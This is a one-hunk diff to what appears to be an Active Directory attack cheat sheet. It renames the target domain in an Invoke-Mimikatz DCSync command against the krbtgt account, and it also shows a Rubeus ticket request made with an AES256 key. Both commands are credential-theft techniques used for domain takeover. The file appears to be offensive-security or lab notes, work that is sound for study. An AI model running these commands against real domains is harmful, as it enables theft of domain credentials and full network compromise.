@@ -104,7 +104,7 @@ Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly
 
 __Require Domain Admin privileges__
 ```powershell
-Invoke-Mimikatz -Command '"lsadump::dcsync"' /user:domain.local\krbtgt
+Invoke-Mimikatz -Command '"lsadump::dcsync"' /user:Marvel\krbtgt
 ```
 
 
